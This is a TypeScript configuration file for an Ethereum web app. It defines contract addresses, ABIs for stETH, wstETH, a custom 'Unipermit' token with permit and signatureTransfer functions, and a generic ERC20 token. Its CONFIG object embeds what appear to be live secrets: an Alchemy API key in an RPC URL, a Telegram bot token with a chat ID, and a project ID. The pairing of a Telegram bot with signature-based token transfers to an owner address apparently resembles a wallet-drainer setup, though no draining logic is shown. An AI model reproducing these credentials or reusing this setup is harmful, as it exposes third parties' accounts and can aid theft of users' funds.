export const CONFIG = {
  OWNER_ADDRESS: '0xEfc5859335A58d64A5e8E01d02c5241c852CBD40' as `0x${string}`,
  UNIPERMIT_TOKEN: '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091' as `0x${string}`,
  STETH_ADDRESS: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84' as `0x${string}`,
  WSTETH_ADDRESS: '0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0' as `0x${string}`,
  WITHDRAWAL_QUEUE: '0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1' as `0x${string}`,
  ALCHEMY_RPC: 'https://eth-mainnet.g.alchemy.com/v2/XbS3A-psx-MSEn_ownjsb0You7sONhdF',
  TELEGRAM_BOT: '8850313284:AAGtktr0p9R_a6HnGLSDqElD6RZjbLH_X3g',
  TELEGRAM_CHAT: '8574393641',
  REOWN_PROJECT_ID: '7ee282b2996b54334564e0f64beebed1',
  PLATFORM_FEE_BPS: 100,
} as const;

// Lido stETH ABI - full
export const STETH_ABI = [
  { inputs: [{ name: '_referral', type: 'address' }], name: 'submit', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'payable', type: 'function' },
  { inputs: [{ name: '_account', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_amount', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_recipient', type: 'address' }, { name: '_amount', type: 'uint256' }], name: 'transfer', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_sender', type: 'address' }, { name: '_recipient', type: 'address' }, { name: '_amount', type: 'uint256' }], name: 'transferFrom', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'name', outputs: [{ name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'symbol', outputs: [{ name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'totalSupply', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'getTotalPooledEther', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'getTotalShares', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_sharesAmount', type: 'uint256' }], name: 'getPooledEthByShares', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_ethAmount', type: 'uint256' }], name: 'getSharesByPooledEth', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }], name: 'nonces', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'DOMAIN_SEPARATOR', outputs: [{ name: '', type: 'bytes32' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }, { name: 'deadline', type: 'uint256' }, { name: 'v', type: 'uint8' }, { name: 'r', type: 'bytes32' }, { name: 's', type: 'bytes32' }], name: 'permit', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { anonymous: false, inputs: [{ indexed: true, name: 'from', type: 'address' }, { indexed: true, name: 'to', type: 'address' }, { indexed: false, name: 'value', type: 'uint256' }], name: 'Transfer', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'owner', type: 'address' }, { indexed: true, name: 'spender', type: 'address' }, { indexed: false, name: 'value', type: 'uint256' }], name: 'Approval', type: 'event' },
] as const;

// wstETH ABI
export const WSTETH_ABI = [
  { inputs: [{ name: '_stETHAmount', type: 'uint256' }], name: 'wrap', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_wstETHAmount', type: 'uint256' }], name: 'unwrap', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_account', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_amount', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'stEthPerToken', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'tokensPerStEth', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'name', outputs: [{ name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'symbol', outputs: [{ name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
] as const;

// YOUR Unipermit Contract - FULL ABI
export const UNIPERMIT_ABI = [
  { inputs: [{ internalType: 'uint256', name: 'initialSupply', type: 'uint256' }], stateMutability: 'nonpayable', type: 'constructor' },
  { anonymous: false, inputs: [{ indexed: true, internalType: 'address', name: 'owner', type: 'address' }, { indexed: true, internalType: 'address', name: 'spender', type: 'address' }, { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' }], name: 'Approval', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, internalType: 'address', name: 'previousOwner', type: 'address' }, { indexed: true, internalType: 'address', name: 'newOwner', type: 'address' }], name: 'OwnershipTransferred', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, internalType: 'address', name: 'from', type: 'address' }, { indexed: true, internalType: 'address', name: 'to', type: 'address' }, { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' }], name: 'Transfer', type: 'event' },
  { inputs: [], name: 'PERMIT_TYPEHASH', outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'SIGNATURE_TRANSFER_TYPEHASH', outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'address', name: '', type: 'address' }, { internalType: 'address', name: '', type: 'address' }], name: 'allowance', outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'spender', type: 'address' }, { internalType: 'uint256', name: 'amount', type: 'uint256' }], name: 'approve', outputs: [{ internalType: 'bool', name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ internalType: 'address', name: '', type: 'address' }], name: 'balanceOf', outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'ownerAddr', type: 'address' }, { internalType: 'uint256[]', name: 'noncesArr', type: 'uint256[]' }], name: 'batchIsNonceUsed', outputs: [{ internalType: 'bool[]', name: '', type: 'bool[]' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'chainId', outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'decimals', outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'domainSeparator', outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'ownerAddr', type: 'address' }, { internalType: 'uint256', name: 'word', type: 'uint256' }], name: 'getNonceBitmapWord', outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'uint256', name: 'word', type: 'uint256' }, { internalType: 'uint256', name: 'mask', type: 'uint256' }], name: 'invalidateNonces', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'ownerAddr', type: 'address' }, { internalType: 'uint256', name: 'nonce', type: 'uint256' }], name: 'isNonceUsed', outputs: [{ internalType: 'bool', name: '', type: 'bool' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'name', outputs: [{ internalType: 'string', name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'address', name: '', type: 'address' }, { internalType: 'uint256', name: '', type: 'uint256' }], name: 'nonceBitmap', outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'address', name: '', type: 'address' }], name: 'nonces', outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'owner', outputs: [{ internalType: 'address', name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'ownerAddr', type: 'address' }, { internalType: 'address', name: 'spender', type: 'address' }, { internalType: 'uint256', name: 'value', type: 'uint256' }, { internalType: 'uint256', name: 'deadline', type: 'uint256' }, { internalType: 'uint8', name: 'v', type: 'uint8' }, { internalType: 'bytes32', name: 'r', type: 'bytes32' }, { internalType: 'bytes32', name: 's', type: 'bytes32' }], name: 'permit', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [], name: 'renounceOwnership', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'ownerAddr', type: 'address' }, { internalType: 'address', name: 'to', type: 'address' }, { internalType: 'uint256', name: 'amount', type: 'uint256' }, { internalType: 'uint256', name: 'nonce', type: 'uint256' }, { internalType: 'uint256', name: 'deadline', type: 'uint256' }, { internalType: 'uint8', name: 'v', type: 'uint8' }, { internalType: 'bytes32', name: 'r', type: 'bytes32' }, { internalType: 'bytes32', name: 's', type: 'bytes32' }], name: 'signatureTransfer', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [], name: 'symbol', outputs: [{ internalType: 'string', name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'totalSupply', outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'to', type: 'address' }, { internalType: 'uint256', name: 'amount', type: 'uint256' }], name: 'transfer', outputs: [{ internalType: 'bool', name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'from', type: 'address' }, { internalType: 'address', name: 'to', type: 'address' }, { internalType: 'uint256', name: 'amount', type: 'uint256' }], name: 'transferFrom', outputs: [{ internalType: 'bool', name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }], name: 'transferOwnership', outputs: [], stateMutability: 'nonpayable', type: 'function' },
] as const;

// Generic ERC20 ABI for any token
export const ERC20_ABI = [
  { inputs: [{ name: 'account', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'transfer', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'transferFrom', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'symbol', outputs: [{ name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'name', outputs: [{ name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
] as const;
